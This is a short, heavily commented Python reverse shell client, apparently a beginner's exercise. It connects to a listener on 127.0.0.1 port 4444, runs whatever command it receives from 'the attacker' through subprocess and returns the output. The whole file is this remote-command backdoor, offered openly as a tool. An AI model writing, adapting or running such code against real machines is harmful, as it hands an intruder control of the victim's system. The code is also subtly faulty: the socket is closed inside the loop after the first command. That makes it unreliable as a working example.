import socket
# subprocess liabery use for stored command & running in background 
import subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("connecting....")
# while loop use for they trying to connect infinty time 
while True:
    try:
        #connect() use for connection with IP and PORT
        s.connect(("127.0.0.1",4444))
        break
    except ConnectionRefusedError:
        pass
print("connected")
#while loop use for recive one or more command
while True:

    #cmd varilabe is use for recive the command for attacker 
    cmd=(s.recv(1024)).decode()
    #getouput() is use take command for user and stored in output varibale
    output=subprocess.getoutput(cmd)
    # if statement use for when attacker send exit command ,they break statement and socket will close  
    if cmd =="exit":
        break
    #send() is use for send data to the attacker
    s.send(output.encode())
    s.close()